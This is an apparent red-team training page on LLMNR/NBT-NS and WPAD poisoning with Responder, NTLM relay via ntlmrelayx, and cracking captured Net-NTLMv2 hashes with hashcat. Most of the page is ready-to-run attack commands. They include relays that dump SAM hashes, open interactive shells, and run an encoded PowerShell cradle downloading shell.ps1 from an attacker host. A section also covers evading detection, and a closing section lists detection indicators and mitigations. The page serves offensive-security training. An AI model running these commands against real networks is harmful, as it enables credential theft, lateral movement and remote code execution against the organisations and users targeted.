---
layout: training-page
title: "Responder & LLMNR Poisoning — Red Team Academy"
module: "Network Attacks"
tags:
  - responder
  - llmnr
  - nbt-ns
  - mdns
  - wpad
  - ntlmv2
  - network
page_key: "network-responder"
render_with_liquid: false
---

# Responder & LLMNR Poisoning

LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are Windows fallback name resolution protocols used when DNS fails. When a host queries a name that doesn't resolve in DNS, it broadcasts an LLMNR/NBT-NS request to the entire subnet — and any host can respond. Responder poisons these broadcasts, impersonates the target, and captures Net-NTLMv2 hashes from every host that authenticates to it.

## How It Works

```
1. Victim types \\FILESERVER into Explorer (or an app tries \\MISTYPED-NAME)
2. DNS lookup fails
3. Victim broadcasts LLMNR query: "Who has FILESERVER?"
4. Responder answers: "I am FILESERVER — authenticate to me"
5. Victim sends Net-NTLMv2 hash (Windows auth challenge/response)
6. Responder captures the hash
7. Hash is cracked offline or relayed to authenticate elsewhere
```

## Environment Check

```bash
# Verify LLMNR/NBT-NS are active (passive — listen only)
responder -I eth0 -A

# Check network for existing LLMNR traffic
tcpdump -i eth0 'udp port 5355 or udp port 137'
# port 5355 = LLMNR
# port 137  = NBT-NS

# Also check for mDNS (port 5353)
tcpdump -i eth0 'udp port 5353'
```

## Running Responder

```bash
# Basic — poison LLMNR/NBT-NS/mDNS and capture NTLMv2 hashes
responder -I eth0

# With WPAD (captures hashes from proxy-aware applications)
responder -I eth0 -w

# With force NTLM downgrade from Kerberos (riskier — more traffic)
responder -I eth0 -F

# Verbose — shows all received queries
responder -I eth0 -v

# Output location
ls /usr/share/responder/logs/
# Responder-Session.log — all activity
# SMB-NTLMv2-*.txt      — captured hashes, one per file
```

## Captured Hash Format

```
# Net-NTLMv2 hash (NOT the same as NTLM hash — cannot be passed directly)
username::domain:challenge:response:NTLMhash

# Example:
jsmith::CONTOSO:1122334455667788:AABBCCDDEEFF...:0101000000...

# Crack with hashcat
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# Or relay instead of cracking (see NTLM relay page in AD module)
```

## WPAD Abuse

```
# WPAD = Web Proxy Auto-Discovery
# Browsers query http://wpad/wpad.dat for proxy config
# If "wpad" doesn't resolve in DNS, LLMNR is used
# Responder -w serves a malicious wpad.dat that forces NTLM auth

responder -I eth0 -w -F

# Every browser on the subnet attempts to fetch wpad.dat
# Responder captures NTLMv2 for each browser session
# -F forces NTLM auth even if Kerberos is available

# Check: is WPAD blocked in DNS?
nslookup wpad
# If it resolves to a real server, -w won't help
# If NXDOMAIN, -w will capture from every browser
```

## MultiRelay / NTLM Relay

```bash
# For relay instead of capture:
# 1. Disable SMB and HTTP servers in Responder (to avoid capturing and breaking relay)
# Edit: /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

# 2. Run Responder to poison only
responder -I eth0 -wr

# 3. Run ntlmrelayx in parallel (Impacket)
ntlmrelayx.py -tf targets.txt -smb2support
# targets.txt = list of IPs where SMB signing is disabled

# Find hosts with SMB signing disabled
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

# ntlmrelayx with command execution
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# ntlmrelayx dump SAM hashes
ntlmrelayx.py -tf targets.txt -smb2support --sam
```

## Inveigh (Windows / PowerShell)

```powershell
# Inveigh — Responder equivalent for Windows post-compromise
# github.com/Kevin-Robertson/Inveigh

# Import and run
Import-Module .\Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y -HTTPS Y -SMB Y

# Get captured hashes
Get-InveighLog
Get-InveighNTLMv2

# C# version (Inveigh.exe) — no PowerShell dependency
.\Inveigh.exe -FileOutput Y
```

## Detection Evasion

```bash
# Target specific names to reduce noise
# Only respond to specific LLMNR queries (not all broadcasts)
# Edit Responder.conf: RespondTo = MISTYPED-NAME,FILESERVER

# Respond only to specific clients
responder -I eth0 --lm  # capture legacy LM hashes too
# Filter source: only answer queries from specific IP ranges

# Time-limited operation — run during business hours only
# Cron: 0 8 * * 1-5 responder -I eth0 -w > /tmp/resp.log &
# Cron: 0 18 * * 1-5 pkill -f responder
```

## Responder Configuration (Responder.conf)

```ini
# /etc/responder/Responder.conf (or wherever Responder is installed)
# Key settings to tune for OPSEC and relay attacks

[Responder Core]

; Servers to start — turn OFF what you don't need to reduce noise
SQL     = Off        # MSSQL auth capture — off unless targeting SQL servers
SMB     = Off        # MUST be Off when using ntlmrelayx relay (can't relay if you capture)
RDP     = Off        # RDP capture — noisy, leave off unless explicitly needed
Kerberos = Off       # Kerberos capture — usually not useful unless downgrading
FTP     = On         # FTP auth capture — safe to leave on
POP     = On         # POP3 auth
SMTP    = On         # SMTP auth
IMAP    = On         # IMAP auth
HTTP    = Off        # MUST be Off when relaying (ntlmrelayx handles this)
HTTPS   = Off        # Same — off when relaying
DNS     = On         # DNS resolution for poisoned names (needed for WPAD)
LDAP    = Off        # Off when relaying — on only for capture-only mode
DCERPC  = Off
WINRM   = Off
SNMP    = Off

[Responder]
; Respond only to these names (blank = respond to everything)
; Use this to target specific mistyped names and reduce noise
RespondTo =
; Ignore queries from these IPs (protect critical systems)
DontRespondTo = 192.168.1.1,192.168.1.10

; LLMNR and NBT-NS poisoning (main functionality — keep on)
LLMNR = On
NBT-NS = On
MDNS   = On

; Challenge for NTLM (default 1122334455667788)
; Set a custom challenge if you want consistent hashes for cracking
Challenge = 1122334455667788
```

## NTLM Relay with ntlmrelayx

NTLM relay is more powerful than offline cracking — relay the hash directly to authenticate to another system in real time.

```bash
# Prerequisites:
# 1. SMB = Off and HTTP = Off in Responder.conf
# 2. SMB signing disabled on target hosts
# 3. Run Responder and ntlmrelayx simultaneously

# Find relay targets (hosts with SMB signing disabled)
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
nmap --script smb2-security-mode -p 445 192.168.1.0/24 \
  | grep -B 5 "Message signing enabled but not required"

# Terminal 1: Responder in poisoning-only mode
responder -I eth0 -wr
# -w = serve WPAD
# -r = answer MDNS queries

# Terminal 2: ntlmrelayx
# Relay to multiple targets — dumps SAM from any host where auth succeeds
ntlmrelayx.py -tf targets.txt -smb2support

# Relay with interactive SMB shell
ntlmrelayx.py -tf targets.txt -smb2support -i
# Opens a TCP listener (127.0.0.1:11000) for each relay — connect with nc

# Relay with command execution
ntlmrelayx.py -tf targets.txt -smb2support \
  -c "powershell -enc $(echo 'IEX (New-Object Net.WebClient).DownloadString(\"http://192.168.1.99/shell.ps1\")' | iconv -t UTF-16LE | base64 -w 0)"

# Relay to LDAP — create new computer account (used for RBCD)
ntlmrelayx.py -tf targets.txt -l /tmp/ldap_loot --delegate-access

# Relay to HTTP (ADCS WebEnroll) — get a certificate for the relayed user
ntlmrelayx.py -t http://CA.contoso.local/certsrv/certfnsh.asp \
  --adcs --template User

# Relay to multiple protocols at once
ntlmrelayx.py -tf targets.txt -smb2support \
  -t ldap://192.168.1.10 -t smb://192.168.1.20 --sam
```

## Cracking Captured NTLMv2 Hashes

```bash
# Hashes are stored in Responder's logs directory
ls /usr/share/responder/logs/
# Files named: SMB-NTLMv2-SSP-<IP>.txt, HTTP-NTLMv2-<IP>.txt

# Collect all unique hashes
cat /usr/share/responder/logs/*.txt | sort -u > all_hashes.txt

# Crack with hashcat — mode 5600 = Net-NTLMv2
# Basic wordlist
hashcat -m 5600 all_hashes.txt /usr/share/wordlists/rockyou.txt

# Wordlist + rules (recommended — covers more password patterns)
hashcat -m 5600 all_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Multiple rule files combined
hashcat -m 5600 all_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/toggles1.rule

# Brute force — up to 8 chars (for simple passwords)
hashcat -m 5600 all_hashes.txt -a 3 ?a?a?a?a?a?a?a?a

# With GPU (specify device)
hashcat -m 5600 all_hashes.txt rockyou.txt -d 1

# Show cracked passwords
hashcat -m 5600 all_hashes.txt --show

# Note: NTLMv2 ≠ NTLM hash — cannot pass NTLMv2 directly
# To pass-the-hash you need the NT hash (from SAM/NTDS dump)
```

## WPAD Poisoning Details

```bash
# WPAD = Web Proxy Auto-Discovery Protocol
# Browsers query: http://wpad.<domain>/wpad.dat for proxy config
# If DNS has no entry for "wpad", LLMNR/NBT-NS broadcast is sent
# Responder captures those broadcasts and serves a rogue wpad.dat

# The rogue wpad.dat forces the browser to authenticate (NTLM) before
# fetching the proxy config — capturing NTLMv2 from every browser

# Verify WPAD queries are happening
tcpdump -i eth0 'udp port 5355' | grep -i wpad

# Responder with WPAD (full flags)
responder -I eth0 -w     # serve WPAD
responder -I eth0 -w -F  # force downgrade from Kerberos to NTLM (-F)
responder -I eth0 -w -b  # also serve Basic auth (captures plaintext password)

# What Responder serves as wpad.dat:
# function FindProxyForURL(url,host){ return "PROXY 192.168.1.99:3128"; }
# Browser fetches this, then authenticates to the "proxy" — Responder captures

# WPAD over DHCP (option 252) — see dhcp-attacks module
# WPAD over DNS — if you control DNS, add wpad A record to capture
# across subnets without LLMNR
```

## Responder Logs and Hash Management

```bash
# Default log directory
ls -la /usr/share/responder/logs/

# Log file naming convention:
# Responder-Session.log          — full session log, all events
# SMB-NTLMv2-SSP-<IP>.txt       — NTLMv2 hashes from SMB
# HTTP-NTLMv2-<IP>.txt          — NTLMv2 from HTTP auth
# LDAP-NTLMv2-<IP>.txt          — NTLMv2 from LDAP
# SMB-NTLMv1-SSP-<IP>.txt       — NTLMv1 hashes (rare, legacy)
# Poisoned-Hosts.txt             — every host that queried Responder

# Monitor live captures
tail -f /usr/share/responder/logs/Responder-Session.log

# Count unique hashes (de-duplicate by username)
sort -u /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
  | cut -d: -f1 | sort -u

# Extract usernames from hashes
grep -h "" /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
  | cut -d: -f1 | sort -u

# Combine all hashes for cracking
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \
    /usr/share/responder/logs/HTTP-NTLMv2-*.txt \
    2>/dev/null | sort -u > combined_hashes.txt

# Database — Responder logs to SQLite
sqlite3 /usr/share/responder/Responder.db \
  "SELECT fullhash FROM responder WHERE type='NTLMv2';" | sort -u
```

## Detection: What Responder Looks Like on the Wire

```
Network indicators:
  - Unexpected LLMNR responses (UDP 5355) from a non-Windows host
    or from a host that has no reason to respond to name queries
  - Same source IP responding to ALL LLMNR queries regardless of name
    (legitimate hosts only respond to queries for their own name)
  - NBT-NS responses (UDP 137) from non-Windows hosts
  - Rapid succession of identical LLMNR responses from a single MAC
  - WPAD HTTP server on an unexpected IP

SIEM detection rules:
  - Alert: LLMNR response from host not in approved server list
  - Alert: Multiple distinct NTLM challenge responses sharing same challenge
    value (indicates a single server capturing all challenges)
  - Alert: Host acting as WPAD server where none is expected
  - Alert: NTLM authentication to internal IP, followed by lateral movement

Host-based indicators:
  - Connections from many different source IPs to same internal IP on port 80, 139, 445
  - Event ID 4624 (Logon) with unknown workstation names

Defensive mitigations:
  - Disable LLMNR via GPO: Computer Configuration → Administrative Templates
    → Network → DNS Client → "Turn off multicast name resolution" = Enabled
  - Disable NBT-NS: Network adapter properties → IPv4 → Advanced → WINS
    → "Disable NetBIOS over TCP/IP"
  - Set DNS record for "wpad" to 127.0.0.1 to block WPAD LLMNR queries
  - Enable SMB signing on all hosts (blocks relay even if hashes captured)
```

## Resources

- Responder — `github.com/lgandx/Responder`
- Inveigh — `github.com/Kevin-Robertson/Inveigh`
- Impacket ntlmrelayx — `github.com/fortra/impacket`
- MITRE T1557.001 — LLMNR/NBT-NS Poisoning — `attack.mitre.org/techniques/T1557/001/`
- AD module NTLM Relay page — `/active-directory/ntlm-relay/`
- Hashcat wiki — `hashcat.net/wiki/`
